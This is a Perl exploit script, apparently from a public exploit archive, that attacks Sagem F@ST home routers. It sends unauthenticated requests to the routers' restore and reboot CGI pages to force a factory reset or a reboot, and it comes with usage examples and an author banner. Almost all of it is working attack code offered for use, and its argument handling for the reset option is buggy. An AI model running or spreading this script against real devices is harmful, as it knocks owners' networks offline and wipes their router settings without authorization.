#!/usr/bin/perl
# Exploit Title: Sagem routers Remote auth bypass Exploit
# Date: 04/03/2010
# Author: AlpHaNiX
# Software Link: null
# Version: Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404
# Tested on: Sagem F@ST 2404


# Code :

use HTTP::Request;
use HTTP::Headers;
use LWP::UserAgent;
system('cls');

sub help()
{
    print "\n[X] the target must be sagem rooter main ip adress\n".
          "[X] affected Versions : Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404)\n".
          "[X] Usage   : perl $0 --function ip \n".
          "[X] Example : ./exploit.pl<http://exploit.pl> --reset 192.168.1.1 \n".
          "[X] Example : ./exploit.pl<http://exploit.pl> --reboot 192.168.1.1 \n";
}
sub header()
{
    print "\n[+]====================================[+]\n".
          "[+] Sagem routers Remote Auth bypass   [+]\n".
          "[+] Found And Exploit By AlpHaNiX      [+]\n".
          "[+] Contact  : AlpHa[at]Hacker[dot]Bz  [+]\n".
          "[+] HomePage : NullArea.Net            [+]\n".
          "[+]====================================[+]\n\n\n"
}
sub resetz()
{
    my $target = $ipz."restoreinfo.cgi" ;
    my $request = HTTP::Request->new(GET=>$target);
    my $useragent = LWP::UserAgent->new();
    my $response = $useragent->request($request);
    if($response->content =~ m/<HTML><HEAD><TITLE>401 Unauthorized<\/TITLE><\/HEAD>/i && $response->content =~ m/<BODY BGCOLOR="#cc9999"><H4>401 Unauthorized<\/H4>/ && $response->content =~ m/<ADDRESS><A HREF="http:\/\/www.acme.com<http://www.acme.com>\/software\/micro_httpd\/">micro_httpd<\/A><\/ADDRESS>/ )
    {
        print "[+] Authentication bypassed !\n" ;
        print "[+] Exploited , $ip is restored" ;
    }
    else
    {
        print "[+] Please make sure you entered real sagem router ip\n" ;
    }
}

sub reboot()
{
    my $target = $ipz."rebootinfo.cgi" ;
    my $request = HTTP::Request->new(GET=>$target);
    my $useragent = LWP::UserAgent->new();
    my $response = $useragent->request($request);
    if($response->content =~ m/<HTML><HEAD><TITLE>401 Unauthorized<\/TITLE><\/HEAD>/i && $response->content =~ m/<BODY BGCOLOR="#cc9999"><H4>401 Unauthorized<\/H4>/ && $response->content =~ m/<ADDRESS><A HREF="http:\/\/www.acme.com<http://www.acme.com>\/software\/micro_httpd\/">micro_httpd<\/A><\/ADDRESS>/ )
    {
        print "[+] Authentication bypassed !\n" ;
        print "[+] Exploited , $ip is rebooted" ;
    }
    else
    {
        print "[+] Please make sure you entered real sagem router ip\n" ;
    }
}

if (@ARGV != 2) { header();help(); exit(); }
else{

    my $i=0;
    foreach (@ARGV)
    {
        if ($ARGV[$i] eq "--reboot"){$ip = $ARGV[$i+1];$function = 'reboot';}
        if ($ARGV[$i] eq "--reset"){$ip = $ARGV[$i];$function = 'reset';}
        $i++;
      }

if ($ip =~ /http:\/\// ) { $ipz = $ip."/"; } else { $ipz = "http://".$ip."/"}

header();
print "[+] Working on $ip ..\n\n";
if($function eq 'reboot'){reboot()}
if($function eq 'reset'){resetz()}
}